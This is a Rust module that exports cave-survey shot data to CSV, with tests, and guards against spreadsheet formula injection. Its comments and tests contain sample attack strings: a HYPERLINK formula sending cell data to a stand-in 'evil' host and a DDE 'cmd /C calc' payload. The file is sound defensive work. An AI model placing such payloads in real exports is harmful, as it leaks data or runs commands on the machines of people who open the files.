use anyhow::{Context, Result};
use std::io::Write;
use std::path::Path;

use super::atomic_write::write_atomic;
use crate::models::Project;

/// Export project data to CSV format
pub fn export_csv(project: &Project, path: &Path) -> Result<()> {
    write_atomic(path, |file| write_csv(project, file)).context("Failed to write CSV file")?;
    tracing::info!(path = ?path, "Exported CSV");
    Ok(())
}

fn write_csv(project: &Project, file: &mut impl Write) -> Result<()> {
    // Write header
    writeln!(
        file,
        "section_id,section_name,shot_id,length,azimuth_in,azimuth_out,depth_in,depth_out,left,right,up,down,kind,comment"
    )?;

    // Write shots
    for section in &project.sections {
        let section_name = section.name.as_deref().unwrap_or("");

        for shot in &section.shots {
            writeln!(
                file,
                "{},{},{},{:.2},{:.1},{:.1},{:.2},{:.2},{},{},{},{},{},{}",
                section.id,
                escape_csv(section_name),
                shot.id,
                shot.length,
                shot.azimuth_in,
                shot.azimuth_out,
                shot.depth_in,
                shot.depth_out,
                format_optional(shot.left),
                format_optional(shot.right),
                format_optional(shot.up),
                format_optional(shot.down),
                shot.kind.label(),
                escape_csv(shot.comment.as_deref().unwrap_or(""))
            )?;
        }
    }
    Ok(())
}

/// Escape a string for CSV, and defuse spreadsheet formula injection.
///
/// Two separate jobs:
///
/// 1. **RFC 4180 quoting** for a field containing a delimiter, a quote or a line
///    break. `\r` counts: a lone CR ends a record in some readers, so a comment
///    holding one would otherwise split a row.
///
/// 2. **Formula neutralisation.** Excel, LibreOffice and Sheets evaluate a cell
///    whose text begins with `=`, `+`, `-`, `@`, tab or CR - quoting does NOT
///    stop this, the formula is parsed after the CSV layer is stripped. The two
///    fields that reach here (`section_name`, `shot.comment`) are attacker
///    controlled: they come verbatim out of an imported `.tml` / `.dat` /
///    `.srv`, so a comment of `=HYPERLINK("http://evil/"&A1,"ok")` would run on
///    open. A leading apostrophe is the standard mitigation (OWASP).
///
/// The `-` case is deliberately included even though it costs a cosmetic
/// apostrophe on a legitimate comment like `-2m to the floor`: `-1+1` is a
/// formula too, and there is no way to tell the two apart without guessing.
fn escape_csv(s: &str) -> String {
    // Order matters: neutralise first, then quote, so the apostrophe is inside
    // the quotes rather than stranded outside them.
    let neutralised = if s.starts_with(['=', '+', '-', '@', '\t', '\r']) {
        format!("'{s}")
    } else {
        s.to_string()
    };
    if neutralised.contains([',', '"', '\n', '\r']) {
        format!("\"{}\"", neutralised.replace('"', "\"\""))
    } else {
        neutralised
    }
}

/// Format an optional f64 value
fn format_optional(value: Option<f64>) -> String {
    value.map(|v| format!("{v:.2}")).unwrap_or_default()
}

#[cfg(test)]
#[expect(clippy::unwrap_used)]
mod tests {
    use super::*;
    use crate::models::{SectionData, ShotData};
    use tempfile::NamedTempFile;

    #[test]
    fn test_export_csv() {
        let mut project = Project::new("Test".to_string(), None);
        project.add_section(SectionData {
            name: Some("Main".to_string()),
            surveyor: None,
            date: None,
            color: "#4ecdc4".to_string(),
            direction: None,
            quality: 1.0,
            shots: vec![ShotData {
                azimuth_in: 45.0,
                azimuth_out: 225.0,
                length: 10.0,
                depth_in: 5.0,
                depth_out: 6.0,
                ..Default::default()
            }],
        });

        let file = NamedTempFile::new().unwrap();
        let result = export_csv(&project, file.path());
        assert!(result.is_ok());

        let contents = std::fs::read_to_string(file.path()).unwrap();
        assert!(contents.contains("section_id,section_name"));
        assert!(contents.contains("Main"));
        assert!(contents.contains("10.00"));
    }

    #[test]
    fn test_escape_csv_handles_commas_quotes_and_newlines() {
        assert_eq!(escape_csv("plain"), "plain");
        assert_eq!(escape_csv("a,b"), "\"a,b\"");
        assert_eq!(escape_csv("a\"b"), "\"a\"\"b\"");
        assert_eq!(escape_csv("a\nb"), "\"a\nb\"");
        assert_eq!(escape_csv("a,\"b\""), "\"a,\"\"b\"\"\"");
    }

    #[test]
    fn test_escape_csv_neutralises_spreadsheet_formulas() {
        // A comment or section name comes verbatim out of an imported survey
        // file, so it is attacker-controlled. Quoting alone does NOT stop a
        // formula - Excel parses the cell text after the CSV layer is stripped.
        assert_eq!(
            escape_csv(r#"=HYPERLINK("http://evil/","ok")"#),
            r#""'=HYPERLINK(""http://evil/"",""ok"")""#,
            "the apostrophe must land INSIDE the quotes"
        );
        for lead in ['=', '+', '-', '@', '\t'] {
            let field = format!("{lead}1+1");
            assert_eq!(escape_csv(&field), format!("'{field}"), "lead {lead:?}");
        }
        // A lone CR would end the record in some readers, so it quotes too.
        assert_eq!(escape_csv("a\rb"), "\"a\rb\"");
        assert_eq!(escape_csv("\rlead"), "\"'\rlead\"");
        // Text that merely CONTAINS an operator is left alone - only the first
        // character decides, matching how the spreadsheets themselves parse.
        assert_eq!(escape_csv("2+2 m to the floor"), "2+2 m to the floor");
        assert_eq!(escape_csv("Main"), "Main");
        assert_eq!(escape_csv(""), "");
    }

    /// The exact table `e2e/agent/lib/exportOracles.ts`'s `escapeCsvMirror`
    /// mirrors, kept here so a change to `escape_csv` fails on THIS side too.
    ///
    /// The agent harness cannot call this function: `export-roundtrip-fuzz`
    /// seeds hostile comments, exports a CSV and then re-checks every cell
    /// against a TypeScript reimplementation of the rule below. A copy that
    /// drifted would go on agreeing with a broken exporter, which is the one
    /// failure mode a neutralisation check must not have. The two halves are
    /// therefore pinned against the same table from both languages; if you
    /// change the rule, change both.
    ///
    /// The three rows nobody reconstructs correctly from memory are the last
    /// three: a leading TAB is neutralised and NOT quoted (tab is in no
    /// quote-trigger set), a leading LF is quoted and NOT neutralised (LF is in
    /// no neutralisation set), and an empty string stays empty.
    #[test]
    fn escape_csv_matches_the_agent_harness_mirror_table() {
        let table: &[(&str, &str)] = &[
            ("", ""),
            ("plain", "plain"),
            ("=cmd|' /C calc'!A0", "'=cmd|' /C calc'!A0"),
            ("+1+1", "'+1+1"),
            ("-2+3", "'-2+3"),
            ("@SUM(1)", "'@SUM(1)"),
            ("\tleading tab", "'\tleading tab"),
            (
                "\rleading carriage return",
                "\"'\rleading carriage return\"",
            ),
            ("\nleading newline", "\"\nleading newline\""),
            ("a,b", "\"a,b\""),
            ("say \"hi\"", "\"say \"\"hi\"\"\""),
            ("line1\nline2", "\"line1\nline2\""),
            ("=a,b", "\"'=a,b\""),
            ("x=1", "x=1"),
            ("\u{6d1e}\u{7a74}", "\u{6d1e}\u{7a74}"),
            ("part one\u{200b}part two", "part one\u{200b}part two"),
        ];
        for (input, expected) in table {
            assert_eq!(&escape_csv(input), expected, "input {input:?}");
        }
    }

    #[test]
    fn test_format_optional_outputs_two_decimals_or_empty() {
        assert_eq!(format_optional(Some(1.234)), "1.23");
        assert_eq!(format_optional(Some(1.235)), "1.24");
        assert_eq!(format_optional(None), "");
    }

    #[test]
    fn test_export_csv_empty_project() {
        let project = Project::new("Empty".to_string(), None);
        let file = NamedTempFile::new().unwrap();
        let result = export_csv(&project, file.path());
        assert!(result.is_ok(), "empty project CSV export should succeed");
        let contents = std::fs::read_to_string(file.path()).unwrap();
        // Should have header row but no data rows
        assert!(contents.contains("section_id,section_name"));
        let lines: Vec<&str> = contents.lines().collect();
        assert_eq!(lines.len(), 1, "only header row expected for empty project");
    }

    #[test]
    fn test_export_csv_unicode_section_name() {
        let mut project = Project::new("Unicode".to_string(), None);
        project.add_section(SectionData {
            name: Some("Grotte de l'Ours 🐻".to_string()),
            surveyor: Some("José García".to_string()),
            date: None,
            color: "#ff0000".to_string(),
            direction: None,
            quality: 1.0,
            shots: vec![ShotData {
                azimuth_in: 45.0,
                azimuth_out: 225.0,
                length: 10.0,
                depth_in: 5.0,
                depth_out: 6.0,
                ..Default::default()
            }],
        });

        let file = NamedTempFile::new().unwrap();
        let result = export_csv(&project, file.path());
        assert!(result.is_ok());
        let contents = std::fs::read_to_string(file.path()).unwrap();
        // CSV only exports section_name, not surveyor - verify Unicode section name
        assert!(
            contents.contains("Grotte de l'Ours"),
            "Unicode section name should be in CSV"
        );
    }

    #[test]
    fn test_escape_csv_empty_string() {
        assert_eq!(escape_csv(""), "");
    }

    #[test]
    fn test_export_csv_multiple_sections() {
        let mut project = Project::new("Multi".to_string(), None);
        for i in 0..3 {
            project.add_section(SectionData {
                name: Some(format!("Sec{i}")),
                color: "#ff0000".to_string(),
                shots: vec![ShotData {
                    azimuth_in: 0.0,
                    azimuth_out: 180.0,
                    length: f64::from(i + 1) * 5.0,
                    depth_in: 0.0,
                    depth_out: 1.0,
                    ..Default::default()
                }],
                ..Default::default()
            });
        }

        let file = NamedTempFile::new().unwrap();
        let result = export_csv(&project, file.path());
        assert!(result.is_ok());
        let contents = std::fs::read_to_string(file.path()).unwrap();
        let data_lines = contents.lines().skip(1).count();
        assert_eq!(data_lines, 3, "should have one row per shot");
    }
}
